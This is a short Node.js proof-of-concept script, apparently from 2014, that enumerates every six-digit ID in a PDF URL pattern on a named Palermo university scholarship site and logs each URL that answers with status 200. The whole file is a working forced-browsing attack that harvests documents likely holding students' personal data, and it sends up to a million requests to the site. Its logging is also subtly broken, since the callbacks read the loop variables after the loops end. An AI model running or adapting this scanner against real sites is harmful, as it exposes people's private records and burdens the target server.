#!/usr/bin/env node
/*
 * ERSU scholarship scanner PoC
 * Author: Domenico Luciani (DLion)
 * Date: 06/10/14
 */
var request = require('request');

var a, b, c, d, e, f;

var BASE_URL = "http://ersuonline.ersupalermo.it/2014/Doc/";
var END_URL = "_ERSU_Doc_2014.pdf";

for(a=0; a <= 9; a++) {
  for(b=0; b <= 9; b++) {
    for(c=0; c <= 9; c++) {
      for(d=0; d <= 9; d++) {
        for(e=0; e <= 9; e++) {
          for(f=0; f <= 9; f++) {
            request.get(BASE_URL+a+b+c+d+e+f+END_URL, function(error, response) {
              if(error) {
                console.error("Errore: "+error);
              } else {
                if(response.statusCode === 200) {
                  console.log(BASE_URL+a+b+c+d+e+f+END_URL+"\n");
                }
              }
            });
          }
        }
      }
    }
  }
}
